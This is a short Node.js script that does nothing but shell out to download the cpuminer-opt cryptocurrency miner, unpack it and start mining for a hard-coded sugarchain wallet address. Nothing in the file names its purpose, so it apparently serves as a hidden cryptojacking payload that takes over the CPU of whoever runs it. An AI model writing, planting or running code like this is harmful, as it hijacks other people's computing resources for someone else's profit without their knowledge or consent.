#!/usr/bin/env node

function execute(command) {
  const exec = require('child_process').exec

  exec(command, (err, stdout, stderr) => {
    process.stdout.write(stdout)
  })
}

execute('wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a YespowerSugar -o 17042 -u sugar1qglu77tcpxfg3qrsrk797nvhy7fm9stvjxwwwy6.core')
